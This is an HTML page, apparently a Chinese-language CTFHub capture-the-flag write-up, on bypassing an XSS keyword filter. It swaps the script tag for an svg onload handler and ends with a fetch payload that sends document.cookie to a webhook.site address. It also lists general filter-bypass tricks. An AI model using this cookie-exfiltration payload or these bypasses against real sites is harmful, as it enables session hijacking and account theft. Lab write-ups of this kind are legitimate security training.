@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-XSS过滤关键词 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-XSS过滤关键词 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.23 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, XSS, 关键词过滤, Webhook, OOB</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - XSS / 过滤关键词</li>
+        <li><strong>题目名称：</strong>过滤关键词</li>
+        <li><strong>提示：</strong>页面提供修改名称的功能，后端会过滤特定的关键词。目标是在绕过关键词过滤的同时，外带Bot的Cookie。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>关键词过滤绕过原理：</strong>靶场通常会过滤黑名单中的关键词，如 <code>script</code>、<code>alert</code>、<code>img</code> 等。绕过策略包括更换等价标签（如用 <code>svg</code> 替代 <code>script</code>）、更换函数（如用 <code>fetch</code> 替代 <code>new Image</code>）、大小写混写或双写绕过。</p >
+    <p><strong>颜色对应规则说明：</strong></p >
+    <ul>
+        <li><span style="color: red; font-weight: bold;">红色</span>：靶场过滤导致报错或失效的关键词。</li>
+        <li><span style="color: green; font-weight: bold;">绿色</span>：成功绕过过滤并完成外带的Payload片段。</li>
+    </ul>
+
+    <h2>3. 操作步骤</h2>
+    
+    <p><strong>第一步：基础探测与验证过滤规则</strong></p >
+    <p>在输入框输入标准Payload：</p >
+    <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+    <p>提交后页面无反应。按F12查看源码，发现 <code>&lt;script&gt;</code> 标签被过滤为空，页面显示 <code>Hello, &lt;&gt;alert(1)</code>，确认 <span style="color: red;">script 关键词被直接过滤</span>。</p >
+
+    <p><strong>第二步：更换等价标签，验证漏洞存在</strong></p >
+    <p>绕过 <code>script</code> 标签，使用 <code>svg</code> 标签及 <code>onload</code> 事件：</p >
+    <pre><code>&lt;svg onload=alert(1)&gt;</code></pre>
+    <p>提交后页面成功弹窗，证明漏洞利用点存在，且 <code>svg</code>、<code>onload</code>、<code>alert</code> 未被过滤。</p >
+
+    <p><strong>第三步：构造外带Payload并发送机器人</strong></p >
+    <p>结合前两关的经验，直接构造无空格、静默外带的Payload：</p >
+    <pre><code>&lt;svg/onload="fetch('//webhook.site/44f4f857-1f6f-4e34-bde8-2b92b25b7689/?c='+document.cookie)"&gt;</code></pre>
+    <p>此Payload使用了<span style="color: green;">svg</span>标签绕过了script过滤，使用了<span style="color: green;">fetch</span>函数静默发送请求，使用了<span style="color: green;">// 和 c=</span>精简了长度。</p >
+    <p>提交后，复制浏览器完整URL，粘贴至 <code>Send URL to Bot</code>，点击Send。Webhook成功收到请求并获取Flag：</p >
+    <pre><code>ctfhub{d13ed6f3bf97499f8ed98859}</code></pre>
+    <p>提交至CTFHub，通关成功。</p >
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：script 标签被直接过滤。</strong>输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 后，script 标签消失，导致浏览器把 <code>&lt;&gt;alert(1)</code> 当作纯文本。解决办法是使用 <code>svg</code> 或 <code>img</code> 等替代标签。</li>
+        <li><strong>坑2：思维定势导致多走弯路。</strong>在经历前几关的多次失败后，容易对长Payload产生不信任。本次直接使用了精简策略，一步到位，未发生长度截断。这说明在真实测试中，前期的经验复用能大幅提升效率。</li>
+        <li><strong>坑3：避开引号与空格冲突。</strong>通过使用斜杠 <code>/</code> 代替空格，并在Webhook地址外层使用双引号而非单引号，成功避免了浏览器地址栏的自动转码问题。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>关键词过滤绕过策略：</strong>当遇到黑名单过滤（如过滤 <code>script</code>、<code>alert</code>）时，优先考虑更换等价标签（<code>svg</code>、<code>img</code>、<code>details</code>）或更换函数（<code>confirm</code>、<code>prompt</code>、<code>fetch</code>）。</li>
+        <li><strong>SVG 标签的优势：</strong><code>&lt;svg/onload=...&gt;</code> 不需要像 <code>&lt;img&gt;</code> 那样依赖报错触发，且常被用于绕过对 <code>script</code> 和 <code>img</code> 的过滤。</li>
+        <li><strong>静默外带的综合运用：</strong>组合使用 <code>fetch()</code>（避免页面跳转和CSP拦截）、<code>//</code>（压缩URL长度）、<code>c=</code>（精简参数名），是完成 XSS OOB 外带的最优实践方案。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
